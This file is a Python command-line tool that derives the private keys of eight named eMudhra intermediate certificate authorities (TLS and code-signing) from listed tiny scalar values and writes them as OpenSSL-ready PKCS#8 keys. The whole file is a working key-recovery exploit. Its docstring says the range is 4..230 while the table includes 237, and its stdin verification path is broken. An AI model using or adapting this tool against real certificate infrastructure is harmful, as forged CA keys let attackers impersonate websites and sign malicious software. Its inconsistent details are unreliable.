#!/usr/bin/env python3
"""Recover an eMudhra CA private key from its leaked, tiny `d` value.

The eMudhra G3B/G3C intermediates were issued with almost-random nonces: the
private scalar `d` is a tiny integer (4 .. 230).  The public key is still a
perfectly valid point on secp384r1 (d * G), so every structural check on the
certificate passes - you only find out by trying.

This script recomputes Q = d * G with plain Python EC arithmetic (no crypto
dependencies) and writes a PKCS#8 EC private key PEM that OpenSSL accepts.

    ./derive_ca_key.py 4                              # -> stdout (PKCS#8 PEM)
    ./derive_ca_key.py 156 -o ca.key --verify certs/em-dv-tls-ca-g3b.pem
    ./derive_ca_key.py --check-all                    # table of all 8 keys
"""

import argparse
import base64
import os
import shlex
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------- the curve
# secp384r1 / NIST P-384 - the curve used by all 8 weak eMudhra CA keys.
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973
B = 0xB3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF
A = -3
GX = 0xAA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7
GY = 0x3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F
CURVE_OID = "1.3.132.0.34"  # secp384r1
KEY_BYTES = 48

# ------------------------------------------------------- the leaked d values
# slug: (d, certificate file, human name)  -- from the public announcement
WEAK_KEYS = {
    "dv-g3b":   (156, "certs/em-dv-tls-ca-g3b.pem",  "EM DV TLS CA - G3B"),
    "dv-g3c":   (230, "certs/em-dv-tls-ca-g3c.pem",  "EM DV TLS CA - G3C"),
    "ev-g3b":   (115, "certs/em-ev-tls-ca-g3b.pem",  "EM EV TLS CA - G3B"),
    "ev-g3c":   (56,  "certs/em-ev-tls-ca-g3c.pem",  "EM EV TLS CA - G3C"),
    "ov-g3b":   (155, "certs/em-ov-tls-ca-g3b.pem",  "EM OV TLS CA - G3B"),
    "ov-g3c":   (4,   "certs/em-ov-tls-ca-g3c.pem",  "EM OV TLS CA - G3C"),
    "ov-cs-g3b": (66, "certs/em-ov-cs-ca-g3b.pem",   "EM OV CS CA - G3B"),
    "ov-cs-g3c": (237, "certs/em-ov-cs-ca-g3c.pem",  "EM OV CS CA - G3C"),
}


# ------------------------------------------------------------- EC arithmetic
def inv(a, m=P):
    return pow(a, m - 2, m)


def point_add(p1, p2):
    """Affine addition on y^2 = x^3 - 3x + b (mod P); None is the point at infinity."""
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and (y1 + y2) % P == 0:
        return None
    if p1 == p2:
        s = (3 * x1 * x1 - 3) * inv(2 * y1) % P
    else:
        s = (y2 - y1) * inv((x2 - x1) % P) % P
    x3 = (s * s - x1 - x2) % P          # affine: a cancels out, doubling and adding
    return (x3, (s * (x1 - x3) - y1) % P)


def on_curve(point):
    if point is None:
        return True
    x, y = point
    return (y * y - (x * x * x + A * x + B)) % P == 0


def multiply(d, point=(GX, GY)):
    """Scalar multiplication by double-and-add."""
    assert on_curve(point), "input point not on curve"
    result, addend = None, point
    while d:
        if d & 1:
            result = point_add(result, addend)
        addend = point_add(addend, addend)
        d >>= 1
    assert on_curve(result), "result not on curve"
    return result


# ------------------------------------------------------------- DER helpers
def der(tag, body):
    """TLV: short form, or 2-byte long form (big enough for EC384 keys)."""
    if len(body) < 0x80:
        return bytes([tag, len(body)]) + body
    if len(body) < 0x100:
        return bytes([tag, 0x81, len(body)]) + body
    return bytes([tag, 0x82, len(body) >> 8, len(body) & 0xFF]) + body


def der_int(value):
    b = value.to_bytes((value.bit_length() + 8) // 8 or 1, "big")
    if b[0] & 0x80:                      # keep it positive
        b = b"\x00" + b
    return der(0x02, b)


def der_oid(oid):
    parts = [int(x) for x in oid.split(".")]
    body = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        chunk, out = [], b""
        while True:
            chunk.insert(0, p & 0x7F)
            p >>= 7
            if not p:
                break
        out = bytes(chunk[i] | 0x80 for i in range(len(chunk) - 1)) + bytes([chunk[-1]])
        body += out
    return der(0x06, body)


def pem(label, data):
    b64 = base64.encodebytes(data).decode()
    return f"-----BEGIN {label}-----\n{b64}-----END {label}-----\n"


def pkcs8_ec_key(d, point):
    """PKCS#8 PrivateKeyInfo wrapping a SEC1 ECPrivateKey (with public point)."""
    sec1 = der(0x30, b"".join([
        der_int(1),                                        # version
        der(0x04, d.to_bytes(KEY_BYTES, "big")),           # private scalar, big-endian, fixed width
        der(0xA0, der_oid(CURVE_OID)),                     # [0] parameters
        # [1] publicKey: BIT STRING (0 unused bits) of the uncompressed point 04||X||Y
        der(0xA1, der(0x03, b"\x00\x04" +
                      point[0].to_bytes(KEY_BYTES, "big") +
                      point[1].to_bytes(KEY_BYTES, "big"))),
    ]))
    algo = der(0x30, der_oid("1.2.840.10045.2.1") + der_oid(CURVE_OID))
    return der(0x30, b"".join([der_int(0), algo, der(0x04, sec1)]))


# --------------------------------------------------------------- utilities
def spki_of_cert(path):
    """SubjectPublicKeyInfo PEM of a certificate, via openssl."""
    out = subprocess.run(["openssl", "x509", "-in", path, "-noout", "-pubkey"],
                         capture_output=True, text=True, check=True)
    return out.stdout.strip()


def spki_of_key(path):
    out = subprocess.run(["openssl", "pkey", "-in", path, "-pubout"],
                         capture_output=True, text=True, check=True)
    if out.returncode:
        sys.exit(f"openssl could not read key {path}: {out.stderr.strip()}")
    return out.stdout.strip()


def normalize(pemtext):
    body = "".join(l for l in pemtext.splitlines()
                   if not l.startswith("-----")).replace("\n", "")
    return body


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("d", type=int, nargs="?", help="leaked private scalar (e.g. 4)")
    ap.add_argument("-o", "--out", help="write the PKCS#8 CA key here (default: stdout)")
    ap.add_argument("--verify", metavar="CERT.PEM",
                    help="check the derived public key against this certificate")
    ap.add_argument("--check-all", action="store_true",
                    help="derive every leaked key and compare with its certificate")
    ap.add_argument("--info", metavar="SLUG",
                    help="print shell assignments for a slug (D=.., CA_CERT=..) and exit")
    a = ap.parse_args()

    if a.info:
        slug = a.info
        if slug not in WEAK_KEYS:
            sys.exit(f"unknown slug {slug!r}; pick one of: {' '.join(WEAK_KEYS)}")
        d, cert, name = WEAK_KEYS[slug]
        print(f"SLUG={slug}\nD={d}\nCA_CERT={shlex.quote(os.path.join(HERE, cert))}"
              f"\nCA_NAME={shlex.quote(name)}")
        return

    if a.check_all:
        print(f"{'slug':10} {'name':20} {'d':>4}  {'Q = d*G':44} match")
        for slug, (d, cert, name) in WEAK_KEYS.items():
            cert = os.path.join(HERE, cert)
            q = multiply(d)
            pemdata = pem("PRIVATE KEY", pkcs8_ec_key(d, q))
            tmp = f"/tmp/derive-{slug}.key"
            open(tmp, "w").write(pemdata)
            ok = normalize(spki_of_key(tmp)) == normalize(spki_of_cert(cert))
            print(f"{slug:10} {name:20} {d:>4}  "
                  f"{format(q[0], '096x')[:20]}..{format(q[1], '096x')[-8:]:8}  "
                  f"{'YES' if ok else 'NO'}")
            if not ok:
                sys.exit(f"  !! derived key for {slug} does not match {cert}")
        print("\nAll 8 leaked d values reproduce the published CA public keys.")
        return

    if a.d is None:
        ap.error("give a d value, or --check-all")
    if not 0 < a.d < N:
        sys.exit(f"d out of range for secp384r1: {a.d}")

    point = multiply(a.d)
    pemdata = pem("PRIVATE KEY", pkcs8_ec_key(a.d, point))
    print(f"# secp384r1 CA private key recovered from d = {a.d}", file=sys.stderr)
    print(f"# Qx = {format(point[0], '096x')}", file=sys.stderr)
    print(f"# Qy = {format(point[1], '096x')}", file=sys.stderr)

    if a.out:
        open(a.out, "w").write(pemdata)
        print(f"# wrote {a.out}", file=sys.stderr)
    else:
        sys.stdout.write(pemdata)

    if a.verify:
        if normalize(spki_of_key(a.out if a.out else "/dev/stdin")) == \
           normalize(spki_of_cert(a.verify)):
            print(f"# OK: public key matches {a.verify}", file=sys.stderr)
        else:
            sys.exit(f"# MISMATCH: derived key does not match {a.verify}")


if __name__ == "__main__":
    main()
